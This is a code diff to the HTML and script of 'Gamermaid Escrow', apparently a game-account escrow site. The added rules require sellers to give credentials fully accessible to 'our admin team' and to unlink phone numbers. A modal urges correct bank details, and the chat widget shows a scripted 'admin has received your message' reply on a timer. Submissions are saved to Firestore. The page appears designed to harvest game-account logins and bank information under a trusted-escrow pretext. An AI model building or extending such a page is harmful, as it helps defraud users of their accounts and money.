@@ -106,6 +106,11 @@
         .chat-input-area { display: flex; padding: 12px; background: #ffffff; border-top: 1px solid var(--glass-border-light); gap: 8px; }
         .chat-input-area input { flex: 1; padding: 8px 12px; border: 1px solid var(--glass-border-light); border-radius: var(--radius-sm); outline: none; font-size: 0.875rem; }
         .chat-send-btn { background: #8b5cf6; color: #ffffff; padding: 8px 14px; border-radius: var(--radius-sm); font-weight: 600; font-size: 0.875rem; }
+
+        @media (max-width: 600px) {
+            .form-grid { grid-template-columns: 1fr; }
+            .form-group.full-width { grid-column: span 1; }
+        }
     </style>
 </head>
 <body>
@@ -117,7 +122,7 @@
             <nav class="navbar">
                 <a href="#" class="logo">
                     <div class="logo-icon"><svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div>
-                    <span class="logo-text">gamermaid</span>
+                    <span class="logo-text">TZE GamerMaid</span>
                 </a>
                 <div class="nav-actions">
                     <button id="navSignInBtn" class="btn-signin">Sign In</button>
@@ -204,56 +209,93 @@
                     </button>
                 </form>
             </div>
+
+            <!-- Rules Section -->
+            <div class="rules-container">
+                <div class="rules-title">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+                    <span>Escrow Terms & Rules</span>
+                </div>
+                <ul class="rules-list">
+                    <li>All account credentials provided must be accurate and fully accessible by our admin team during verification.</li>
+                    <li>Sellers must ensure phone numbers are completely unlinked from the account prior to submission.</li>
+                    <li>Payouts are processed strictly within 24 hours after successful verification and transfer completion.</li>
+                    <li>Any fraudulent submissions, incorrect bank info, or attempts to reclaim accounts will result in immediate cancellation of the escrow transaction.</li>
+                    <li>For support inquiries, contact our team directly at ai@gamermaid.site.</li>
+                </ul>
+            </div>
         </div>
     </main>
 
     <!-- Live Chat Widget -->
-    <button class="chat-widget-btn" id="chatToggleBtn"><svg class="icon" viewBox="0 0 24 24" style="width:24px;height:24px;"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></button>
+    <button class="chat-widget-btn" id="chatToggleBtn" aria-label="Open Chat"><svg class="icon" viewBox="0 0 24 24" style="width:24px;height:24px;"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></button>
     <div class="chat-box-container" id="chatBox">
         <div class="chat-header"><span>Chat with Admin</span><button id="chatCloseBtn" style="color:white; font-weight:700; cursor:pointer;">&times;</button></div>
         <div class="chat-messages" id="chatMessages"><div class="chat-msg incoming">Hello! Welcome to Gamermaid Escrow. How can we help you today?</div></div>
         <div class="chat-input-area"><input type="text" id="chatInput" placeholder="Type a message..."><button class="chat-send-btn" id="chatSendBtn">Send</button></div>
     </div>
 
-    <!-- Modals -->
+    <!-- Confirmation Modal -->
     <div class="modal-backdrop" id="confirmationModal">
         <div class="modal-card">
             <div class="modal-status-icon"><svg class="icon" style="width:32px;height:32px;" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
             <h3 class="modal-title">Verification In Progress</h3>
-            <p class="modal-desc">The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.</p>
+            <p class="modal-desc">
+                The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.<br>
+                <strong style="color: var(--text-primary); display:block; margin-top:8px;">(Make sure You fill the Bank info Correctly).</strong>
+            </p>
             <div class="modal-contact">Need Help? Contact ai@gamermaid.site</div>
             <button class="btn-signin" style="width:100%; cursor:pointer;" id="closeModalBtn">Close Window</button>
         </div>
     </div>
 
+    <!-- Firebase Auth Modal (Email/Password & Guest Anonymous) -->
     <div class="modal-backdrop" id="authModal">
         <div class="modal-card" style="text-align: left; max-width: 420px;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                 <h3 class="modal-title" id="authModalTitle" style="margin: 0; font-size: 1.25rem;">Sign In to Gamermaid</h3>
-                <button id="closeAuthModal" style="font-size: 1.25rem; cursor: pointer; background:none; border:none;">&times;</button>
+                <button id="closeAuthModal" style="font-size: 1.25rem; cursor: pointer; background:none; border:none; color: var(--text-muted);">&times;</button>
             </div>
-            <button id="googleLoginBtn" style="width: 100%; padding: 12px; background: #ffffff; border: 1px solid var(--glass-border-light); border-radius: var(--radius-full); font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; margin-bottom: 20px; box-shadow: var(--shadow-sm);">
-                <svg style="width:18px;height:18px;" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6a5.64 5.64 0 0 1-2.45 3.7v3.08h3.96c2.32-2.14 3.63-5.3 3.63-9.22z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.96-3.08c-1.08.72-2.45 1.16-3.97 1.16-3.05 0-5.63-2.06-6.55-4.83H1.35v3.15C3.39 21.31 7.37 24 12 24z"/><path fill="#FBBC05" d="M5.45 14.34a7.22 7.22 0 0 1 0-4.68V6.51H1.35a11.96 11.96 0 0 0 0 10.98l4.1-3.15z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.37 0 3.39 2.69 1.35 6.51l4.1 3.15c.92-2.77 3.5-4.91 6.55-4.91z"/></svg>
-                <span>Continue with Google</span>
+
+            <!-- Anonymous Guest Login Button -->
+            <button id="anonLoginBtn" style="width: 100%; padding: 12px; background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-full); font-weight: 600; cursor: pointer; margin-bottom: 20px; color: var(--text-primary);">
+                ⚡ Quick Guest / Anonymous Sign In
             </button>
+
+            <div style="text-align: center; color: var(--text-light); font-size: 0.85rem; margin-bottom: 20px; position: relative;">
+                <span style="background: white; padding: 0 10px; position: relative; z-index: 1;">OR WITH EMAIL</span>
+                <hr style="border: none; border-top: 1px solid var(--glass-border-light); position: absolute; top: 50%; left: 0; right: 0; z-index: 0;">
+            </div>
+
             <form id="emailAuthForm">
-                <div class="form-group" style="margin-bottom: 16px;"><label for="authEmail">Email</label><input type="email" id="authEmail" required placeholder="name@example.com"></div>
-                <div class="form-group" style="margin-bottom: 24px;"><label for="authPassword">Password</label><input type="password" id="authPassword" required placeholder="Password"></div>
+                <div class="form-group" style="margin-bottom: 16px;">
+                    <label for="authEmail" style="font-size: 0.85rem; font-weight: 600; display: block; margin-bottom: 6px;">Email Address</label>
+                    <input type="email" id="authEmail" required placeholder="name@example.com" style="width: 100%; padding: 10px 14px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: var(--bg-secondary);">
+                </div>
+                <div class="form-group" style="margin-bottom: 24px;">
+                    <label for="authPassword" style="font-size: 0.85rem; font-weight: 600; display: block; margin-bottom: 6px;">Password</label>
+                    <input type="password" id="authPassword" required placeholder="At least 6 characters" style="width: 100%; padding: 10px 14px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: var(--bg-secondary);">
+                </div>
                 <button type="submit" id="authSubmitBtn" class="btn-continue" style="width: 100%; padding: 12px; border-radius: var(--radius-full);">Sign In</button>
             </form>
-            <p style="text-align: center; margin-top: 16px; font-size: 0.85rem;"><span id="toggleAuthModeText">Don't have an account?</span> <button id="switchAuthModeBtn" style="color: #8b5cf6; font-weight: 600;">Sign up</button></p>
+            
+            <p style="text-align: center; margin-top: 16px; font-size: 0.85rem; color: var(--text-muted);">
+                <span id="toggleAuthModeText">Don't have an account?</span> 
+                <button id="switchAuthModeBtn" style="color: #8b5cf6; font-weight: 600; background:none; border:none; cursor:pointer;">Sign up</button>
+            </p>
         </div>
     </div>
 
-    <!-- Clean Event Controller Script -->
+    <!-- Controller Script referencing modular firebase-config.js -->
     <script type="module">
-        import { loginWithGoogle, registerEmail, loginEmail, trackAuth, saveEscrowSubmission, saveChatMessage } from "./firebase-config.js";
+        import { registerEmail, loginEmail, loginAnonymous, trackAuth, saveEscrowSubmission, saveChatMessage } from "./firebase-config.js";
 
         document.addEventListener('DOMContentLoaded', () => {
             const escrowForm = document.getElementById('escrowForm');
             const confirmationModal = document.getElementById('confirmationModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
 
+            // Handle Escrow Submission
             escrowForm.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 const formData = new FormData(escrowForm);
@@ -262,7 +304,7 @@
                 try {
                     await saveEscrowSubmission(data);
                 } catch (err) {
-                    console.error('Firestore save error:', err);
+                    console.error('Firestore submission save error:', err);
                 }
                 confirmationModal.classList.add('active');
             });
@@ -272,7 +314,7 @@
                 escrowForm.reset();
             });
 
-            // Chat UI
+            // Chat Widget Interactions
             const chatToggleBtn = document.getElementById('chatToggleBtn');
             const chatBox = document.getElementById('chatBox');
             const chatCloseBtn = document.getElementById('chatCloseBtn');
@@ -299,15 +341,23 @@
                 try {
                     await saveChatMessage(text);
                 } catch (err) {
-                    console.error('Chat save error:', err);
+                    console.error('Firestore chat save error:', err);
                 }
+
+                setTimeout(() => {
+                    const replyMsg = document.createElement('div');
+                    replyMsg.className = 'chat-msg incoming';
+                    replyMsg.textContent = 'An admin has received your message and will review it shortly.';
+                    chatMessages.appendChild(replyMsg);
+                    chatMessages.scrollTop = chatMessages.scrollHeight;
+                }, 1000);
             }
 
-            // Auth UI modal hooks
+            // Auth UI & Handlers
             const navSignInBtn = document.getElementById('navSignInBtn');
             const authModal = document.getElementById('authModal');
             const closeAuthModal = document.getElementById('closeAuthModal');
-            const googleLoginBtn = document.getElementById('googleLoginBtn');
+            const anonLoginBtn = document.getElementById('anonLoginBtn');
             const emailAuthForm = document.getElementById('emailAuthForm');
             const switchAuthModeBtn = document.getElementById('switchAuthModeBtn');
             const authModalTitle = document.getElementById('authModalTitle');
@@ -315,6 +365,7 @@
             const toggleAuthModeText = document.getElementById('toggleAuthModeText');
 
             let isSignUpMode = false;
+
             navSignInBtn.addEventListener('click', (e) => { e.preventDefault(); authModal.classList.add('active'); });
             closeAuthModal.addEventListener('click', () => authModal.classList.remove('active'));
 
@@ -326,14 +377,23 @@
                 switchAuthModeBtn.textContent = isSignUpMode ? "Sign in" : "Sign up";
             });
 
-            googleLoginBtn.addEventListener('click', async () => {
-                try { await loginWithGoogle(); } catch (err) { alert("Google Auth error: " + err.message); }
+            // Anonymous / Guest Authentication
+            anonLoginBtn.addEventListener('click', async () => {
+                try {
+                    await loginAnonymous();
+                    alert("Signed in successfully as Guest!");
+                    authModal.classList.remove('active');
+                } catch (err) {
+                    alert("Anonymous Sign-In Error: " + err.message);
+                }
             });
 
+            // Email & Password Authentication
             emailAuthForm.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 const email = document.getElementById('authEmail').value;
                 const password = document.getElementById('authPassword').value;
+
                 try {
                     if (isSignUpMode) {
                         await registerEmail(email, password);
@@ -349,8 +409,13 @@
                 }
             });
 
+            // Track Auth state changes across the application
             trackAuth((user) => {
-                navSignInBtn.textContent = user ? (user.displayName || user.email.split('@')[0]) : "Sign In";
+                if (user) {
+                    navSignInBtn.textContent = user.isAnonymous ? "Guest User" : (user.displayName || user.email.split('@')[0]);
+                } else {
+                    navSignInBtn.textContent = "Sign In";
+                }
             });
         });
     </script>
